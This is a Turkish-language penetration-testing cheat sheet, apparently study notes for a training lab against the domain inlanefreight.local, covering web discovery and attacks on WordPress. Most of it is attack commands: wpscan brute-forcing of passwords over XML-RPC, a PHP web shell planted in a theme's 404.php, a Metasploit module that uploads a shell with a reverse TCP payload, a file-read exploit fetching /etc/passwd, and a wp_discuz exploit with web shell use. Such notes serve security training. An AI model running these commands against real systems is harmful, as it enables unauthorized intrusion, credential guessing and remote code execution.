---
{"dg-publish":true,"permalink":"/cheat-sheet/attacking-common-applications-cheat-sheet/"}
---


#### Nmap - Web Discovery

```shell-session
nmap -p 80,443,8000,8080,8180,8888,10000 --open -oA web_discovery -iL scope_list 
```


#### EyeWitness ile Web Uygulamalarının Ekran Görüntülerini Alma

```
eyewitness --web -x web_discovery.xml -d inlanefreight_eyewitness
```


#### Aquatone ile Nmap Çıktılarıyla Web Uygulamalarını Keşfetme ve Ekran Görüntüsü Alma

```
cat web_discovery.xml | ./aquatone -nmap
```


----

### WordPress Tespiti

```
curl -s http://blog.inlanefreight.local | grep WordPress
```


### WordPress Tema Bilgisi Tespiti

```
curl -s http://blog.inlanefreight.local/ | grep themes
```


### WordPress Plugin Bilgisi Tespiti

```shell-session
curl -s http://blog.inlanefreight.local/?p=1 | grep plugins
```


### WordPress Zafiyet Tarama ve Numaralandırma

```
sudo wpscan --url http://blog.inlanefreight.local --enumerate --api-token dEOFB<SNIP>
```


---

### WPScan ile XML-RPC Üzerinden WordPress Şifre Kırma Saldırısı

```shell-session
sudo wpscan --password-attack xmlrpc -t 20 -U username -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local
```


### WordPress Üzerinden PHP Dosyası Düzenleyerek Sistem Komutları Çalıştırma

- **Appearance > Theme Editor**
- **Transport Gravity'yi pas geç**
- **Twenty Nineteen temasını seç**
- **404.php dosyasını düzenle**
- **Kod ekle:**
- Update File  

```php
system($_GET[0]);
```

http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?cmd=whoami


### Metasploit ile WordPress Yönetici Panelinden Shell Erişimi Alma

```shell-session
msf6 > use exploit/unix/webapp/wp_admin_shell_upload 

[*] No payload configured, defaulting to php/meterpreter/reverse_tcp

msf6 exploit(unix/webapp/wp_admin_shell_upload) > set rhosts blog.inlanefreight.local
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set username john
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set password firebird1
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set lhost 10.10.14.15 
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set rhost 10.129.42.195  
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set VHOST blog.inlanefreight.local
```


### Mail Masta Plugin'i ile WordPress'te Dosya Okuma Zafiyeti Kullanımı

```
curl -s http://blog.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
```



### WP Discuz Eklentisi ile WordPress Zafiyetinin Kullanımı

```
python3 wp_discuz.py -u http://blog.inlanefreight.local -p /?p=1
```

 * -p geçerli bir path'in

Yazılan exploit başarısız olabilir, ancak yüklenen web shell'i kullanarak komutları çalıştırmak için cURL kullanabiliriz.

```
curl -s http://blog.inlanefreight.local/wp-content/uploads/2021/08/uthsdkbywoxeebg-1629904090.8191.php?cmd=id
```


